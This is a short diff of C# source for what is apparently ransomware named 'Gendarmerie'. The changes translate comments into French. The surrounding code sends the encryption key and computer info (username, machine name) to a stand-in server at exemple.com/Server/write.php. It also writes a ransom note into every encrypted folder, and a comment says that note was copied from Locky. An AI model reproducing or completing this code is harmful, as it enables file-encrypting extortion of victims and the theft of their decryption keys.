@@ -23,8 +23,8 @@ namespace Gendarmerie_B.V._3
     {
         [DllImport("user32.dll", CharSet = CharSet.Auto)]
         private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
-        //Url to send encryption key and computer info
-        string targetURL = "http://exemple.com/Server/write.php";
+        //url pour envoyer les infos au serveur,vous pouvez negliger en cas de besoin
+        string targetURL = "http://exemple.com/Server/write.php"; //en cas de besoin d'envoyer les infos dans le serveur
         string userName = Environment.UserName;
         string computerName = System.Environment.MachineName.ToString();
         string userDir = "C:\\Users\\";
@@ -308,7 +308,7 @@ namespace Gendarmerie_B.V._3
             catch (Exception) { }
         }
 
-        //Create a message to store in every crypted path
+        //creation du message ,j'ai juste pris le message de LOOCKY (Cryptlooker) ,vous pouvez ecrire votre message 
         public void messageCreator()
         {
             string path = "\\Desktop\\Message.txt";
